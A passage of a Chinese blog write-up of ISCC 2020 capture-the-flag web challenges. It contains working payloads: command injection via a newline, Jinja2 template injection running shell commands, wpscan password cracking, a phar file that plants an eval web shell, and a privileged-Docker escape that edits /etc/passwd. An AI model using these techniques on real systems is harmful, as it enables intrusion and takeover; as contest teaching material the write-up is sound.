<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
?>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/IS20CC20abc%$.txt<span class="token punctuation">"</span></span> <span class="token attr-name">download</span><span class="token punctuation">></span></span>下载文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从认证回显结果可以看到有一个txt文件可以下载，尝试访问得到部分源码（这里有一个坑！！！，不能直接访问<code>IS20CC20abc%$.txt</code>，需要对<code>%$</code>进行URL编码，不然会报404错误<code>Your browser sent a request that this server could not understand</code>）</p>
<p>正确的URL访问如下：</p>
<pre><code>http://101.201.126.95:7010/IS20CC20abc%25%24.txt</code></pre><p><code>IS20CC20abc%$.txt</code>：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$pp</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pp</span> <span class="token operator">===</span> <span class="token string">'flag.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span> <span class="token punctuation">(</span> <span class="token string">"Location: ./flag.php"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>审计部分代码可知，需要变量<code>$result</code>值经过base64解码之后等于字符串<code>flag.php</code></p>
<p>base64编码字符串<code>flag.php</code> –&gt;&gt; <code>ZmxhZy5waHA=</code></p>
<p>继续回到主页面，提交<code>ZmxhZy5waHA=</code>，可是发现页面并没有跳转到<code>./flag.php</code>，猜测存在过滤，对<code>ZmxhZy5waHA=</code>进行改写绕过过滤：<code>Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p>
<p>回到主页面提交特定字符串跳转到<code>./flag.php</code>得到flag</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525185702033.png" alt="image-20200525185702033"></p>
<pre><code>flag{welcomekenan{toiscc}}</code></pre><h2 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520160615240.png" alt="image-20200520160615240"></p>
<p>考点：命令注入</p>
<p>题目直接给了源码让进行审计，如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token string">"/[;|&amp;].*[a-zA-Z]+/"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad domain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">'ping -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>审计可得变量<code>ip</code>存在注入，但是代码对<code>ip</code>变量进行了特殊字符与字母的过滤</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232134129.png" alt="image-20200520232134129"></p>
<p>这里因为是<code>shell_exec</code>函数并且正则对特殊字符进行了过滤，所以可以使用换行符<code>%0a</code>进行截断绕过限制</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232431767.png" alt="image-20200520232431767"></p>
<p>通过审计绕过限制之后直接命令注入执行读取flag文件</p>
<pre><code>?ip=127.0.0.1 %0acat flag.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232802167.png" alt="image-20200520232802167"></p>
<pre><code>flag{6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma}</code></pre><h1 id="擂台题-Web"><a href="#擂台题-Web" class="headerlink" title="擂台题-Web"></a>擂台题-Web</h1><h2 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501184412559.png" alt="image-20200501184412559"></p>
<p>考点：jinja2模板注入</p>
<p>题目提示python模板注入</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501175913738.png" alt="image-20200501175913738"></p>
<p>典型的模板注入案例，没有过滤，直接构造利用payload</p>
<pre><code>http://101.201.126.95:7050/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /usr/src/app/flog').read()") }}{% endif %}{% endfor %}

http://101.201.126.95:7050/{{ config.__class__.__init__.__globals__['os'].popen('cat flog').read() }}</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501175759627.png" alt="image-20200501175759627"></p>
<p><strong>附题目源码</strong></p>
<ul>
<li>index.py</li>
</ul>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding:utf-8</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>parse
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"python template injection"</span>

@app<span class="token punctuation">.</span>errorhandler<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"&lt;h1>URL %s not found&lt;/h1>&lt;br/>"</span><span class="token operator">%</span> url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="简简单单，干掉WP"><a href="#简简单单，干掉WP" class="headerlink" title="简简单单，干掉WP"></a>简简单单，干掉WP</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508211808736.png" alt="image-20200508211808736"></p>
<p>考点：渗透测试</p>
<p>题目打开是一个大家所熟悉的CMS框架Wordpress站点</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525134455310.png" alt="image-20200525134455310"></p>
<p>先查看WP版本：访问<code>readme.html</code>或使用<code>wpscan</code>进行扫描探测</p>
<pre><code> → Qftm :~/Desktop# wpscan --url http://94.191.116.98:64555/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...

[i] Update completed.

[+] URL: http://94.191.116.98:64555/
[+] Started: Fri May  8 22:38:46 2020

Interesting Finding(s):

[+] http://94.191.116.98:64555/
 | Interesting Entries:
 |  - Server: nginx/1.17.10
 |  - X-Powered-By: PHP/7.2.30
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://94.191.116.98:64555/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Latest, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://94.191.116.98:64555/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;
 |  - http://94.191.116.98:64555/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/
 | Latest Version: 2.3 (up to date)
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: &#39;Version: 2.3&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;=========================&gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Fri May  8 22:42:30 2020
[+] Requests Done: 70
[+] Cached Requests: 3
[+] Data Sent: 14.687 KB
[+] Data Received: 15.181 MB
[+] Memory used: 178.301 MB
[+] Elapsed time: 00:03:44
</code></pre><p>访问<code>http://94.191.116.98:64555/robots.txt</code>得到后台页面</p>
<pre><code>http://94.191.116.98:64555/wp-login.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525135515352.png" alt="image-20200525135515352"></p>
<p>想办法登录网站，使用<code>wpscan</code>探测网站有哪些用户</p>
<pre><code>wpscan --url http://94.191.116.98:64555 -e u</code></pre><pre><code>[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://94.191.116.98:64555/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre><p>探测到存在<code>admin和jerry</code>两个网站用户，将用户存储在文件<code>user</code>中</p>
<p>下来使用<code>cewl</code>根据网站生成破解密码<code>pass</code></p>
<pre><code>cewl http://94.191.116.98:64555/ -w pass</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525140426163.png" alt="image-20200525140426163"></p>
<p>通过<code>wpscan</code>利用生成的user和pass两个文件进行破解验证后台</p>
<pre><code>wpscan --url http://94.191.116.98:64555 -U user -P pass</code></pre><pre><code>[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;===============================&gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - jerry / egIsNNNnotHe                                                                            
Trying admin / Author Time: 00:00:02 &lt;==================================&gt; (106 / 106) 100.00% Time: 00:00:02

[i] Valid Combinations Found:
 | Username: jerry, Password: egIsNNNnotHe</code></pre><p>验证结果得到网站后台一组用户名和密码</p>
<pre><code>Username: jerry, Password: egIsNNNnotHe</code></pre><p>使用得到的账户名和密码登录后台，拿到flag</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525140852543.png" alt="image-20200525140852543"></p>
<pre><code>flag{wEak_pAsS_1s_deNge20us}</code></pre><h2 id="大黑阔"><a href="#大黑阔" class="headerlink" title="大黑阔"></a>大黑阔</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524205322406.png" alt="image-20200524205322406"></p>
<p>考点：phar反序列化、Docker逃逸提权</p>
<p>题目上来就是一个上传界面，不用说就有过滤【只能上传gif】，对网站进行敏感信息收集</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524205700064.png" alt="image-20200524205700064"></p>
<p>泄露网站源码<code>www.zip</code>，下载源码</p>
<p>upload.php</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$tmp_file_location</span><span class="token operator">=</span><span class="token string">'/var/www/html/'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$tmp_file_location</span><span class="token punctuation">.</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token variable">$tmp_file_location</span><span class="token punctuation">.</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span><span class="token variable">$tmp_file_location</span><span class="token punctuation">.</span> <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token keyword">else</span>
  <span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>show.php</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>分析源码，可知可以利用phar反序列化进行利用，主要是因为show.php存在phar反序列化可用点：类AnyClass和函数file_exists()，file_exists在处理phar文件时会反序列化phar文件中用户自定义的meta-data字段，其中phar文件类型不由后缀决定</p>
<p>编写脚本生成具有攻击载荷的phar文件</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'exp-q.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"exp-q.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span> <span class="token string">'eval(@$_POST[\'q\']);'</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看生成的phar文件</p>
<pre><code>00000000  3C 3F 70 68  70 20 5F 5F   48 41 4C 54  5F 43 4F 4D  &lt;?php __HALT_COM
00000010  50 49 4C 45  52 28 29 3B   20 3F 3E 0D  0A 6A 00 00  PILER(); ?&gt;..j..
00000020  00 01 00 00  00 11 00 00   00 01 00 00  00 00 00 3B  ...............;
00000030  00 00 00 4F  3A 38 3A 22   41 6E 79 43  6C 61 73 73  ...O:8:&quot;AnyClass
00000040  22 3A 31 3A  7B 73 3A 36   3A 22 6F 75  74 70 75 74  &quot;:1:{s:6:&quot;output
00000050  22 3B 73 3A  31 39 3A 22   65 76 61 6C  28 40 24 5F  &quot;;s:19:&quot;eval(@$_
00000060  50 4F 53 54  5B 27 71 27   5D 29 3B 22  3B 7D 01 00  POST[&#39;q&#39;]);&quot;;}..
00000070  00 00 61 01  00 00 00 52   48 CA 5E 01  00 00 00 43  ..a....RH.^....C
00000080  BE B7 E8 B6  01 00 00 00   00 00 00 61  98 14 3A DC  ...........a..:.
00000090  67 2A 62 13  5F C6 2F 99   A8 27 BA 44  F5 32 B3 5F  g*b._./..&#39;.D.2._
000000A0  02 00 00 00  47 42 4D 42                             ....GBMB </code></pre><p>对于本地生成的phar文件，依据上传限制，直接更改phar文件后缀为gif，上传phar.gif直接Getshell</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524213347383.png" alt="image-20200524213347383"></p>
<p>在服务器上没有找到flag，可能权限不够，由于服务器上开着docker，并且www用户可以直接操作docker的部署</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524214010529.png" alt="image-20200524214010529"></p>
<p>下来直接利用docker启动特权容器或者cap-add=SYS_ADMIN（或映射宿主机文件到容器中）</p>
<pre><code>docker run -it --privileged=true ubuntu /bin/bash</code></pre><p>此时docker容器具有mount权限，进入容器挂载宿主机目录到容器中，修改宿主机的<code>/etc/passwd</code>进行提取得到flag</p>
<pre><code>flag{Nobody_knows_Hackuoer_better_than_me}</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不谈ISCC赛制怎么样，对于不同阶段的人也是有一定的学习和提高。</p>
<pre><code>文章首发于安全客：https://www.anquanke.com/post/id/206658</code></pre>
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://Qftm.github.io/2020/05/26/ISCC_2020_Web_WriteUp/">http://Qftm.github.io/2020/05/26/ISCC_2020_Web_WriteUp/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Qftm</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                        </div>
